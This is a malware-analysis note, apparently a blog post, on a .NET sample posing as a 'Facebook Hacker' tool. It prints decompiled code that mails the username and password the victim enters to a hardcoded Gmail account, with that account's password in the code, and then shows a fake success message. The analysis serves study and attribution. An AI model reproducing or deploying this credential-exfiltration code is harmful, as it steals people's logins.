# [Quick Note] Analyze .NET sample d604c7b184563fa2a79f0596ff57611d

# Overview
MD5: d604c7b184563fa2a79f0596ff57611d </br>

Through static analysis, known this sample have a another name ```Facebook Hacker V .9``` maybe it's a hacking tools, the time compiled at ```Mon Oct 18 04:58:01 2010``` and this sample has been programmed by .NET. </br>

# Analyze
Signature of this sample </br>
```
code-page:              Unicode UTF-16, little endian
FileDescription:        Facebook Hacker V .9
FileVersion:            1.0.0.0
InternalName:           Facebook_Hacker_V._9.exe
LegalCopyright:         Copyright Â©  2010
OriginalFilename:       Facebook_Hacker_V._9.exe
ProductName:            Facebook Hacker V .9
ProductVersion:         1.0.0.0
Assembly Version:       1.0.0.0
```

This sample developing by .NET languague, so using ```dnSpy``` tools to analyze and debug it. After loading into ```dnSpy```, quick look functions ```InitializeComponent``` can see this sample have 1 form with 4 label objects, 3 text box objects, 1 button object, 1 progessbar objects and a few picture objects loaded from resources.
```
private void InitializeComponent()
{
	this.components = new Container();
	ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
	this.PictureBox1 = new PictureBox();
	this.Label1 = new Label();
	this.TextBox1 = new TextBox();
	this.Label2 = new Label();
	this.TextBox2 = new TextBox();
	this.Label3 = new Label();
	this.TextBox3 = new TextBox();
	this.Label4 = new Label();
	this.Button1 = new Button();
	this.ProgressBar1 = new ProgressBar();
	this.Timer1 = new Timer(this.components);
	((ISupportInitialize)this.PictureBox1).BeginInit();
	this.SuspendLayout();
	this.PictureBox1.BackgroundImage = Resources.FaceBook_256x256;
	this.PictureBox1.ErrorImage = null;
	Control arg_EC_0 = this.PictureBox1;
	Point location = new Point(500, 1);
	arg_EC_0.Location = location;
	this.PictureBox1.Name = "PictureBox1";
	Control arg_11D_0 = this.PictureBox1;
	Size size = new Size(250, 237);
	arg_11D_0.Size = size;
	this.PictureBox1.TabIndex = 0;
	this.PictureBox1.TabStop = false;
	this.Label1.AutoSize = true;
	this.Label1.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Regular, GraphicsUnit.Point, 0);
	this.Label1.ForeColor = SystemColors.Control;
	Control arg_18C_0 = this.Label1;
	location = new Point(12, 82);
	arg_18C_0.Location = location;
	this.Label1.Name = "Label1";
	Control arg_1B7_0 = this.Label1;
	size = new Size(83, 20);
	arg_1B7_0.Size = size;
	this.Label1.TabIndex = 1;
	this.Label1.Text = "Username";
	Control arg_1EE_0 = this.TextBox1;
	location = new Point(101, 84);
	arg_1EE_0.Location = location;
	this.TextBox1.Name = "TextBox1";
	Control arg_21C_0 = this.TextBox1;
	size = new Size(149, 20);
	arg_21C_0.Size = size;
	this.TextBox1.TabIndex = 2;
	this.Label2.AutoSize = true;
	this.Label2.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Regular, GraphicsUnit.Point, 0);
	this.Label2.ForeColor = SystemColors.ControlLightLight;
	Control arg_27E_0 = this.Label2;
	location = new Point(12, 113);
	arg_27E_0.Location = location;
	this.Label2.Name = "Label2";
	Control arg_2A9_0 = this.Label2;
	size = new Size(78, 20);
	arg_2A9_0.Size = size;
	this.Label2.TabIndex = 3;
	this.Label2.Text = "Password";
	Control arg_2E0_0 = this.TextBox2;
	location = new Point(101, 115);
	arg_2E0_0.Location = location;
	this.TextBox2.Name = "TextBox2";
	this.TextBox2.PasswordChar = '*';
	Control arg_31C_0 = this.TextBox2;
	size = new Size(149, 20);
	arg_31C_0.Size = size;
	this.TextBox2.TabIndex = 4;
	this.Label3.AutoSize = true;
	this.Label3.Font = new Font("Microsoft Sans Serif", 21.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
	this.Label3.ForeColor = SystemColors.Control;
	Control arg_37E_0 = this.Label3;
	location = new Point(10, 9);
	arg_37E_0.Location = location;
	this.Label3.Name = "Label3";
	Control arg_3AC_0 = this.Label3;
	size = new Size(303, 33);
	arg_3AC_0.Size = size;
	this.Label3.TabIndex = 5;
	this.Label3.Text = "Facebook Hacker V .9";
	Control arg_3E9_0 = this.TextBox3;
	location = new Point(166, 177);
	arg_3E9_0.Location = location;
	this.TextBox3.Name = "TextBox3";
	Control arg_417_0 = this.TextBox3;
	size = new Size(169, 20);
	arg_417_0.Size = size;
	this.TextBox3.TabIndex = 6;
	this.Label4.AutoSize = true;
	this.Label4.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Regular, GraphicsUnit.Point, 0);
	this.Label4.ForeColor = SystemColors.Control;
	Control arg_47F_0 = this.Label4;
	location = new Point(198, 154);
	arg_47F_0.Location = location;
	this.Label4.Name = "Label4";
	Control arg_4AA_0 = this.Label4;
	size = new Size(100, 20);
	arg_4AA_0.Size = size;
	this.Label4.TabIndex = 7;
	this.Label4.Text = "Victim E-mail";
	this.Button1.Font = new Font("Microsoft Sans Serif", 15.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
	Control arg_505_0 = this.Button1;
	location = new Point(166, 203);
	arg_505_0.Location = location;
	this.Button1.Name = "Button1";
	Control arg_533_0 = this.Button1;
	size = new Size(169, 59);
	arg_533_0.Size = size;
	this.Button1.TabIndex = 8;
	this.Button1.Text = "HACK";
	this.Button1.UseVisualStyleBackColor = true;
	Control arg_57A_0 = this.ProgressBar1;
	location = new Point(16, 268);
	arg_57A_0.Location = location;
	this.ProgressBar1.Name = "ProgressBar1";
	Control arg_5A8_0 = this.ProgressBar1;
	size = new Size(482, 40);
	arg_5A8_0.Size = size;
	this.ProgressBar1.TabIndex = 9;
	SizeF autoScaleDimensions = new SizeF(6f, 13f);
	this.AutoScaleDimensions = autoScaleDimensions;
	this.AutoScaleMode = AutoScaleMode.Font;
	this.BackColor = SystemColors.ActiveCaptionText;
	size = new Size(749, 328);
	this.ClientSize = size;
	this.Controls.Add(this.ProgressBar1);
	this.Controls.Add(this.Button1);
	this.Controls.Add(this.Label4);
	this.Controls.Add(this.TextBox3);
	this.Controls.Add(this.Label3);
	this.Controls.Add(this.TextBox2);
	this.Controls.Add(this.Label2);
	this.Controls.Add(this.TextBox1);
	this.Controls.Add(this.Label1);
	this.Controls.Add(this.PictureBox1);
	this.FormBorderStyle = FormBorderStyle.FixedSingle;
	this.Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
	this.MaximizeBox = false;
	this.Name = "Form1";
	this.StartPosition = FormStartPosition.CenterScreen;
	this.Text = "Facebook Hacker V .9";
	((ISupportInitialize)this.PictureBox1).EndInit();
	this.ResumeLayout(false);
	this.PerformLayout();
}
```
Because this sample have a 1 button object with name ```HACK``` so focus to anlyze operation of it after click button. </br>
This functions handle for object button ```HACK``` is ```Button1_Click```. This function will get input text string in 2 text box ```Username``` ```Password``` and have a condition to checking it if not fill into 2 text box program notify ```Username Is Missing``` and ```Password Is Missing```. </br>
Afer get input text strings, it will send this information for email ```todorovic.todorovic25@gmail.com``` with subject mail has been setup into code and after send mail successfully and program printing output messages ```Successfully hacking, password is located in C/:Documents``` to deceive victim is account facebook has been hacked.
```
private void Button1_Click(object sender, EventArgs e)
{
	bool flag = Operators.CompareString(this.TextBox1.Text, "", false) == 0;
	if (flag)
	{
		Interaction.MsgBox("Username Is Missing", MsgBoxStyle.OkOnly, null);
		flag = (Operators.CompareString(this.TextBox2.Text, "", false) == 0);
		if (flag)
		{
			Interaction.MsgBox("Password Is Missing", MsgBoxStyle.OkOnly, null);
		}
	}
	SmtpClient smtpClient = new SmtpClient();
	MailMessage mailMessage = new MailMessage();
	smtpClient.Credentials = new NetworkCredential("todorovic.todorovic25@gmail.com", "todorovic");
	smtpClient.Port = 587;
	smtpClient.Host = "smtp.gmail.com";
	smtpClient.EnableSsl = true;
	smtpClient.Send(new MailMessage
	{
		From = new MailAddress("todorovic.todorovic25@gmail.com"),
		To = 
		{
			"todorovic.todorovic25@gmail.com"
		},
		Subject = "Username: " + this.TextBox1.Text,
		Body = "Username : " + this.TextBox1.Text + ", Password : " + this.TextBox2.Text
	});
	this.Timer1.Start();
	Interaction.MsgBox("Successfully hacking, password is located in C/:Documents", MsgBoxStyle.OkOnly, null);
}
```
When anlyze, have detect interested string ```C:\Users\Todor\AppData\Local\Temporary Projects\Facebook Hacker V .9\obj\x86\Debug\Facebook_Hacker_V._9.pdb``` it's pdb path. Base-on it, this sample has been build by machine have username ```Todor``` maybe have a name of attacker </br>
```
Note: PDB is a program database file, is a special symbol file, that contains all the identifiers and names used in the source code file - function, class and variable names. 
PDB path is inserted to the executable file by a compiler, when "Debug" build is selected.
Often used in the attribution of malware sample to specific threat actor or group. 
PDB path usually contains path and name of projects.
```